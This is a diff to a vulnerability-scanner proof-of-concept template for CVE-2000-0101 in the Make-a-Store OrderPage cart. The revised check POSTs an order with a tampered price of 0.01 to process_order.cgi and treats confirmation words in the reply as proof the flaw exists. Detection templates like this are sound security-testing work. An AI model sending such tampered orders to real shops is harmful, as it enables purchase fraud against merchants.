@@ -1,10 +1,10 @@
 [info]
-author = "ave"
-description = "检测目标网站是否存在 Make-a-Store OrderPage 购物车应用的隐藏表单字段信息篡改漏洞。该漏洞允许远程用户通过修改页面中隐藏表单字段（如价格、数量等敏感购买信息）来篡改订单内容。"
+author = "AVE"
+description = "检测 Make-a-Store OrderPage 购物车应用是否存在隐藏表单字段篡改漏洞。通过提交被篡改的隐藏字段（价格、数量等敏感购买信息），验证服务器是否未对客户端提交的关键交易数据进行服务端校验。"
 id = "POC-AVE-2000-0085"
-name = "Make-a-Store OrderPage 隐藏表单字段信息篡改检测 PoC"
+name = "CVE-2000-0101 PoC"
 severity = "high"
-tags = ["ave-2000-0085"]
+tags = ["cve-2000-0101"]
 vuln_id = [
     "CVE-2000-0101",
     "AVE-2000-0085",
@@ -14,20 +14,24 @@ vuln_id = [
 logic = "all"
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/OrderPage"
+method = "POST"
+path = "/{{BaseURL}}/orderpage/process_order.cgi"
 protocol = "http"
 
+[poc.requests.body]
+content = "product_id=1001&quantity=1&price=0.01&shipping=0.00&total=0.01&submit=1"
+type = "raw"
+
 [poc.requests.headers]
-User-Agent = "Mozilla/5.0"
+Content-Type = "application/x-www-form-urlencoded"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "<input",
-    'type="hidden"',
-    "price",
-    "quantity",
+    "order",
+    "confirm",
+    "success",
+    "thank you",
 ]
